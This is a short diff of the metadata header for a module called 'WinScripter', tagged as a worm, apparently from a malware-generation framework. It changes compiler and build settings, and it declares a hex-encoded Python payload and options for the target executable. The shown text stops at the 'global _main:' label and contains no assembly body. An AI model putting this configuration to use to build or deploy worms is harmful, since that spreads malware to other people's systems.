@@ -1,13 +1,14 @@
 #!name##WinScripter
 #!types##worm
-#!info##A worm written in assembler (win32). Runs the command line and calls a python script.
+#!info##A worm written in assembler [W] [x86]. Runs the command line and calls a python script.
 #!lang##asm
 #!banned##module##starter##shadow##junk
 #!reqPayload##WS_script##Python Script
 #!payStep##encode_hex
 #!system_FLAG##[W]
-#!globalVar##COMPILER_NAME##MC_win32##Compiler name
+#!globalVar##COMPILER##mingw-x32##Compiler name
 #!globalVar##OS_EXEC##win##Target system executable
+#!globalVar##NO_DLL##True##Not include DLL
 #!processWorm##BasicAsm
 
 global _main:
